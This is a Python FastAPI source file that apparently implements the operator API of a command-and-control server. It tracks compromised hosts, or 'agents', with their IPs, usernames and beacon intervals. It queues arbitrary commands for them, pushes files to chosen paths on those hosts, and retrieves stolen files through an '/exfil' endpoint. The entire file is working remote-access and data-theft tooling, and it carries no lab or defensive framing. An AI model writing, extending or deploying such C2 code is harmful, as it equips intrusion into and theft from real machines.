import os
import base64
from pathlib import Path
from fastapi import APIRouter, Depends, HTTPException, UploadFile, File, Form
from fastapi.responses import Response
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from datetime import datetime, timezone
from database import get_db, Agent, Task
from auth import require_auth, User

router = APIRouter(prefix="/api/agents", tags=["agents"])

UPLOADS_DIR = Path(__file__).parent.parent / "uploads"


def agent_to_dict(a: Agent) -> dict:
    last_seen_dt = a.last_seen
    if last_seen_dt and last_seen_dt.tzinfo is None:
        last_seen_dt = last_seen_dt.replace(tzinfo=timezone.utc)

    seconds_ago = None
    is_online = False
    if last_seen_dt:
        seconds_ago = (datetime.now(timezone.utc) - last_seen_dt).total_seconds()
        is_online = seconds_ago < (a.sleep_interval * 3 + 15)

    return {
        "id": a.id,
        "hostname": a.hostname,
        "ip_external": a.ip_external,
        "ip_internal": a.ip_internal,
        "os_info": a.os_info,
        "username": a.username,
        "pid": a.pid,
        "sleep_interval": a.sleep_interval,
        "last_seen": a.last_seen.isoformat() if a.last_seen else None,
        "seconds_ago": int(seconds_ago) if seconds_ago is not None else None,
        "online": is_online,
        "registered_at": a.registered_at.isoformat() if a.registered_at else None,
        "note": a.note,
        "cwd": a.cwd or "",
        "tags": [t.strip() for t in (a.tags or "").split(",") if t.strip()],
    }


@router.get("")
def list_agents(db: Session = Depends(get_db), _: User = Depends(require_auth)):
    agents = db.query(Agent).order_by(Agent.registered_at.desc()).all()
    return [agent_to_dict(a) for a in agents]


@router.get("/{agent_id}")
def get_agent(agent_id: str, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    return agent_to_dict(agent)


@router.delete("/{agent_id}")
def delete_agent(agent_id: str, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    db.query(Task).filter(Task.agent_id == agent_id).delete()
    db.delete(agent)
    db.commit()
    return {"message": "Agent deleted"}


class NoteUpdate(BaseModel):
    note: str


@router.patch("/{agent_id}/note")
def update_note(agent_id: str, req: NoteUpdate, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent.note = req.note
    db.commit()
    return {"message": "Note updated"}


class TagsUpdate(BaseModel):
    tags: list


@router.patch("/{agent_id}/tags")
def update_tags(agent_id: str, req: TagsUpdate, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")
    agent.tags = ",".join(t.strip() for t in req.tags if t.strip())
    db.commit()
    return {"message": "Tags updated"}


class TaskRequest(BaseModel):
    command: str


@router.post("/{agent_id}/tasks")
def create_task(
    agent_id: str,
    req: TaskRequest,
    db: Session = Depends(get_db),
    _: User = Depends(require_auth),
):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")

    task = Task(agent_id=agent_id, command=req.command)
    db.add(task)
    db.commit()
    db.refresh(task)
    return {"task_id": task.id, "command": task.command, "status": task.status}


@router.get("/{agent_id}/tasks")
def list_tasks(agent_id: str, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    tasks = (
        db.query(Task)
        .filter(Task.agent_id == agent_id)
        .order_by(Task.created_at.desc())
        .limit(100)
        .all()
    )
    return [
        {
            "id": t.id,
            "command": t.command,
            "output": t.output,
            "status": t.status,
            "created_at": t.created_at.isoformat() if t.created_at else None,
            "completed_at": t.completed_at.isoformat() if t.completed_at else None,
        }
        for t in tasks
    ]


@router.get("/{agent_id}/tasks/{task_id}")
def get_task(agent_id: str, task_id: str, db: Session = Depends(get_db), _: User = Depends(require_auth)):
    task = db.query(Task).filter(Task.id == task_id, Task.agent_id == agent_id).first()
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return {
        "id": task.id,
        "command": task.command,
        "output": task.output,
        "status": task.status,
        "created_at": task.created_at.isoformat() if task.created_at else None,
        "completed_at": task.completed_at.isoformat() if task.completed_at else None,
    }


# ── File Upload (operator → agent) ───────────────────────────────────────────

@router.post("/{agent_id}/upload")
async def upload_file(
    agent_id: str,
    dest_path: str = Form(...),
    file: UploadFile = File(...),
    db: Session = Depends(get_db),
    _: User = Depends(require_auth),
):
    agent = db.query(Agent).filter(Agent.id == agent_id).first()
    if not agent:
        raise HTTPException(status_code=404, detail="Agent not found")

    # Create task first to get its ID, then use ID as part of storage path
    task = Task(agent_id=agent_id, command="__pending__")
    db.add(task)
    db.commit()
    db.refresh(task)

    # Store file keyed by task_id so beacon can fetch it unambiguously
    safe_name = os.path.basename(file.filename or "file")
    stage_dir = UPLOADS_DIR / agent_id / task.id
    stage_dir.mkdir(parents=True, exist_ok=True)
    file_path = stage_dir / safe_name

    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)

    # Now update task command with the real values
    task.command = f"__upload__:{safe_name}:{dest_path}"
    db.commit()

    return {
        "task_id": task.id,
        "filename": safe_name,
        "dest_path": dest_path,
        "size": len(content),
        "status": "pending",
    }


# ── File Download (agent → operator) ─────────────────────────────────────────

@router.get("/{agent_id}/exfil/{task_id}")
def download_exfil(
    agent_id: str,
    task_id: str,
    db: Session = Depends(get_db),
    _: User = Depends(require_auth),
):
    task = db.query(Task).filter(Task.id == task_id, Task.agent_id == agent_id).first()
    if not task or not task.output.startswith("__b64file__:"):
        raise HTTPException(status_code=404, detail="Exfiltrated file not found")

    # Format: __b64file__:{filename}:{base64data}
    _, filename, b64data = task.output.split(":", 2)
    data = base64.b64decode(b64data)

    return Response(
        content=data,
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )
